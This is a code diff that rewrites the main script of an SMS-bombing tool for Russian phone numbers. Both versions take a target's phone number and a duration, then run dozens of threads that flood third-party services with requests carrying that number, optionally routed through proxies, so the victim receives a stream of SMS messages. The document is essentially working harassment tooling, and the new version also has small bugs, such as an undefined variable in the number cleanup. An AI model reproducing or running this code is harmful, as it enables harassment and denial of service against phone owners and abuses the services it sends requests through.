@@ -1,106 +1,95 @@
-#!/usr/bin/env python3
+#!/usr/bin/python3
 
-import os
 import json
-import argparse
-import threading
-from itertools import cycle
-from time import time, sleep
+import time
+import random
 from requests import exceptions
-import conf.config as cfg
+from itertools import cycle
+from threading import Thread
+from argparse import ArgumentParser
 from service import Service
-from randomData import shuffleServices
+import conf.config as cfg
 
 
-def startBomber():
-    shuffleServices(services)
-    for elem in cycle(services):
-        if time() >= args.time:
-            return
-        sleep(interval)
-        service = Service(elem, timeout, proxy)
+def flood(args, services):
+    for service_info in cycle(random.sample(services, len(services))):
+        if time.time() >= args.time:
+            return 
+        service = Service(service_info, args.timeout, args.proxy)
         service.parse_data()
-        service.replace_data(phone)
+        service.replace_data(args.phone)
         try:
             service.send_request()
             print(f"Success - {service.domain_name}")
         except exceptions.ReadTimeout:
-            print(f"FAIL - {service.domain_name} - ReadTimeout")
+            print(f"Fail - {service.domain_name} - ReadTimeout")
         except exceptions.ConnectTimeout:
-            print(f"FAIL - {service.domain_name} - ConnectTimeout")
+            print(f"Fail - {service.domain_name} - ConnectTimeout")
         except exceptions.ConnectionError:
-            print(f"FAIL - {service.domain_name} - ConnectionError")
-        except KeyboardInterrupt:
-            threading._shutdown()
+            print(f"Fail - {service.domain_name} - ConnectionError")
+        except Exception as err:
+            print(err) 
+        except (KeyboardInterrupt, SystemExit):
+            exit()
+
+def main():
+    # Creating parser obj
+    parser = ArgumentParser(
+        description="Sms bomber for russian phones"
+    )
+    parser.add_argument("-p", "--phone",
+                        metavar="<phone-number>", type=str,
+                        help="target's phone number, format no matters")
+    parser.add_argument("-t", "--time",
+                        metavar="<seconds>", type=float,
+                        help="bombing time in seconds")
+    parser.add_argument("--threads", default=50,
+                        type=int, metavar="<num>",
+                        help="bomber's threads count (default: %(default)s)")
+    parser.add_argument("-T", "--timeout", default=3,
+                        type=float, metavar="<seconds>",
+                        help="request's timeout, (default: %(default)s)")
+    parser.add_argument("--proxy", action="store_true", default=None,
+                        help="use proxy from config.py file")
+    parser.add_argument("--version", action="version",
+                        version="%(prog)s " + cfg.__version__)
+    
+    args = parser.parse_args()
+    
+    # If user don't use phone and time parametrs 
+    if not args.phone:
+        args.phone = input("Enter target's phone number in any format: ")
+    if not args.time:
+        args.time = float(input("Enter bombing time in seconds: "))
+    
+    # Check proxy flag
+    if args.proxy:
+        args.proxy = cfg.proxies
+
+    # Cleanup phone number
+    for trash in ("'", '"', "_", "-", "(", ")", " ", "+"):
+        if trash in args.phone:
+            args.phone = args.phone.replace(trash, "")
+    if args.phone[0] == "8":
+        args.phone = "7" + phone[1::]
+    if args.phone[0] == "9":
+        args.phone = "7" + phone[1::]
+
+    # Set stop time value
+    args.time += time.time()
+
+    # Load and shuffle services list 
+    with open("services.json", "r") as file:
+        services = json.load(file)["services"]
+
+    print(cfg.banner)    
+    
+    # Start threads 
+    for thread in range(args.threads):
+        Thread(target=flood, 
+               args=(args, services, )
+        ).start()
 
 
-# Creating parser obj
-parser = argparse.ArgumentParser(
-    description="Ultimate sms bomber - bombila. Russian numbers only",
-    prog="bombila", epilog="Usage example: python3 bombila.py -p 79877771122 -t 20")
-# Optional args
-parser.add_argument(
-    "-p", "--phone", metavar="<phone>",
-    help="target's russian phone number, format no matters")
-parser.add_argument(
-    "-t", "--time", metavar="<seconds>",
-    type=float, help="bombing time in seconds")
-parser.add_argument(
-    "--threads", default=100, type=int, metavar="<int>",
-    help="threads count, more threads = more sms, (default: %(default)s)")
-parser.add_argument(
-    "-i", "--interval", default=0, type=float, metavar="<seconds>",
-    help="intervals between requests in sec, (default: %(default)s)")
-parser.add_argument(
-    "-T", "--timeout", default=3, type=float, metavar="<seconds>",
-    help="timeout for request in sec, (default: %(default)s)")
-parser.add_argument(
-    "--proxy", action="store_true", default=None,
-    help="use proxy while bombing")
-parser.add_argument(
-    "-v", "--version", action="version",
-    version="%(prog)s " + cfg.__version__)
-args = parser.parse_args()
-
-# Targets phone number
-phone = args.phone
-if not phone:
-    phone = input("Enter target's phone number: ")
-for trash in ("'", '"', "-", "_", "(", ")", " "):
-    if trash in phone:
-        phone = phone.replace(trash, "")
-if phone[0] == '+':
-    phone = phone[1::]
-if phone[0] == '8':
-    phone = '7' + phone[1::]
-if phone[0] == '9':
-    phone = '7' + phone
-
-# Bombing time
-if not args.time:
-    args.time = int(input("Enter bombing time in seconds: "))
-# Doesn't creating "time" var because
-# it is will conflict with "time" func from module "time"
-args.time += time()
-
-# Other args
-threads = args.threads
-interval = args.interval
-timeout = args.timeout
-proxy = args.proxy
-if proxy:
-    proxy = cfg.proxies
-
-with open("services.json", "r") as file:
-    services = json.load(file)["services"]
-
-os.system("clear")
-print(cfg.banner)
-
-# Creating threads
-for thread in range(threads):
-    threading.Thread(target=startBomber).start()
-
-# Killing all threads when bombers work is done
-threading._shutdown()
-print('all done!!!')
+if __name__ == "__main__":
+    main()
